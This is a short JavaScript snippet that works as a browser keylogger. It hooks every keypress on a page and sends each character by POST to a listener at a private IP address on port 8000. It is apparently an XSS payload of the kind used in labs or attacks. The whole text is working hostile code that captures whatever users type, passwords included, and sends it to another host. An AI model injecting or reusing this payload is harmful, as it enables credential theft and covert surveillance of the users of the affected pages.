document.onkeypress = function(evt) {
evt = evt || window.event
key = String.fromCharCode(evt.charCode)
if (key) {
var http = new XMLHttpRequest();
var param = encodeURI(key)
http.open("POST","http://192.168.0.101:8000/",true);
http.setRequestHeader("Content-type","application/x-www-form-urlencoded");
http.send("key="+param);
}
}